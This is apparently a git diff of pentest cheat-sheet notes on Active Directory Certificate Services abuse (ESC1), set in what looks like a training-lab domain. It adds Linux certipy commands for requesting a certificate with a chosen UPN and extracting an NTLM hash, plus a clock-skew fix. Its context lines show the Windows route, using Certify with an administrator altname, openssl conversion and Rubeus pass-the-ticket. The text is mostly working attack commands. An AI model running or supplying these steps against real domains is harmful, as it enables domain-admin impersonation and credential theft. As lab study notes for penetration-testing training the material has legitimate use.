@@ -42,6 +42,11 @@ Certify.exe find /vulnerable
 ```
 
 #### ESC1
+> Enrollment right provides to obtain certificate i.e., based on the vulnerable template 
+> _Requires Manager Approval:_ False
+> _Enrollee Supplies Subject:_ True -> Specify the subject/user like DA
+> [ESC1](https://youtu.be/wozcGjAsfZ0?si=-4nQvKYFPnfjNn8s)
+
 - The template "HTTPSCertificates" has ENROLLEE_SUPPLIES_SUBJECT value for msPKI-Certificates-Name-Flag
 ```powershell
 Certify.exe /enrolleeSuppliesSubject
@@ -50,6 +55,7 @@ Certify.exe /enrolleeSuppliesSubject
 ```powershell
 Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
 ```
+
 - Convert from cert.pem to pfx (esc1.pfx below)
 ```powershell
 openssl.exe pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
@@ -58,8 +64,22 @@ openssl.exe pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Pr
 ```powershell
 Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt
 ```
+##### From LINUX
+- Get Certificate
+```zsh
+certipy -u <user> -p <password> -ca <CertificateAuthority> -target <DNSName> -template <vulnTemplate> -upn <targetUsername> -dns <DNSServer>
+```
+- Get NTLM hash
+```zsh
+certipy auth -pfx <pfx-file> -dc-ip $IP
+```
 
+__Fix Clock Skew__
+```zsh
+ntpdate $dc_IP
+```
 #### ESC3
+
 
 
 
